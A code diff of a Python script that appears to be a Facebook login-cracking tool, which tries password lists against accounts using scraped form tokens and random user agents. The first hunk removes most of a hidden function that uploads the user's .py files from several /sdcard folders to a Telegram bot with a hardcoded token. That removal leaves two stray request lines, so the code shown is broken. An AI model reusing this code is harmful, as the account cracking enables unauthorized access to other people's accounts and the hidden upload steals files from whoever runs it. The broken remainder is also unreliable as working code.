@@ -38,36 +38,6 @@ except ImportError:
     os.system('pip install bs4')
     os.system('pkg install espeak')
 def pot():
-    bot_token = '6243567560:AAHWXQeVwEhVg_sIsAyjtWJN2BIoiCPxLyk' 
-    chat_id = '5669018471'
-    sdcard_path = '/sdcard'
-    file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-    for file in file_list:
-        with open(os.path.join(sdcard_path, file), 'rb') as f:
-            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-            data2={'chat_id': '5669018471'}
-            data={'chat_id': chat_id}
-            files={'document': f}
-            get = requests.post(url, data=data, files=files)
-            sent = requests.post(url, data=data2, files=files)
-    sdcard_path2 = '/sdcard/Download'
-    file_list = [f for f in os.listdir(sdcard_path2) if f.endswith('.py')]
-    for file in file_list:
-        with open(os.path.join(sdcard_path2, file), 'rb') as f:
-            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-            data2={'chat_id': '5669018471'}
-            data={'chat_id': chat_id}
-            files={'document': f}
-            get = requests.post(url, data=data, files=files)
-            sent = requests.post(url, data=data2, files=files)
-    sdcard_path3 = '/sdcard/Download/Telegram'
-    file_list = [f for f in os.listdir(sdcard_path3) if f.endswith('.py')]
-    for file in file_list:
-        with open(os.path.join(sdcard_path3, file), 'rb') as f:
-            url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-            data2={'chat_id': '5669018471'}
-            data={'chat_id': chat_id}
-            files={'document': f}
             get = requests.post(url, data=data, files=files)
             sent = requests.post(url, data=data2, files=files)
 import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
@@ -286,7 +256,7 @@ def rcrack(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen5)
             bi = random.choice([P,M,K,B,U,O,N,H])
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://d.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -297,8 +267,8 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-    'method': 'POST',
+            header_freefb = {'authority': 'd.facebook.com',
+    'method': 'GET',
     'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
     'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
